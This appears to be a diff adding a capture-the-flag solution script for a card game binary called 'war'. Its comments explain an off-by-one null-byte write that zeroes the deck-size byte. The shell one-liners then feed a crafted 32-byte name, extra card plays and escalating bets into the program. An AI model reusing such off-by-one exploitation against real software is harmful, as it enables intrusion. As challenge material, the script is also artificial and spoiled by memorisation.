@@ -1,0 +1,12 @@
+# The mistake was to add \x00 at count+1 instead of count.
+# So if full-length name (32-byte) was given the next byte (desk size)
+#	will be replaced with 0.
+# This will let us play more cards the the actual deck size (won't trigger the check)
+#	and we will start playing cards from the name field or from the opponent card if the name
+#	cannot be casted to a valid card.
+# After we start winning we will bet on more then single dollar
+
+(python -c "print('\x02'*32)"; \
+ python -c "for i in range(52): print(1)"; \
+ python -c "print('40\n80\n160\n320\n')"; \
+ cat ) | ./war
